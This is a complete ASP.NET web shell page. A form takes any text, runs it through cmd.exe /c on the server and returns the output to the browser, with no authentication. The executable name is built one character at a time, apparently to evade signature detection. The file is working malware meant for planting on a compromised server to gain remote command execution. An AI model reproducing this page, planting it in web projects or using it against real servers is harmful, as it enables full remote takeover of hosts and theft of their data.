<%@ Page Language="C#" %>
<%@ Import namespace="System.Diagnostics"%>
<%@ Import Namespace="System.IO" %>

<html>
<body>
    <form id="formCommand" runat="server">
    <div>
        <table>
            <tr>
                <td width="30">Command:</td>
                <td><asp:TextBox ID="txtCommand" runat="server" Width="820px"></asp:TextBox></td>
            </tr>
	    <tr>
                <td>&nbsp;</td>
                <td><asp:Button ID="btnExecute" runat="server" OnClick="btnExecute_Click" Text="Execute" /></td>
            </tr>
        </table>
    </div>
    </form>
</body>
</html>

<script runat="server">
    protected void btnExecute_Click(object sender, EventArgs e)
    {
			
        Response.Write("<pre>");
        Response.Write(Server.HtmlEncode(this.ExecuteCommand(txtCommand.Text)));
        Response.Write("</pre>");
    }

    private string ExecuteCommand(string command)
    {
        try
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "c" + "m" + "d" + "." + "e" +  "x" + "e";
            processStartInfo.Arguments = "/c " + command;
            processStartInfo.RedirectStandardOutput = true;
            processStartInfo.UseShellExecute = false;

            Process process = Process.Start(processStartInfo);
            using (StreamReader streamReader = process.StandardOutput)
            {
                string ret = streamReader.ReadToEnd();
                return ret;
            }
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
</script>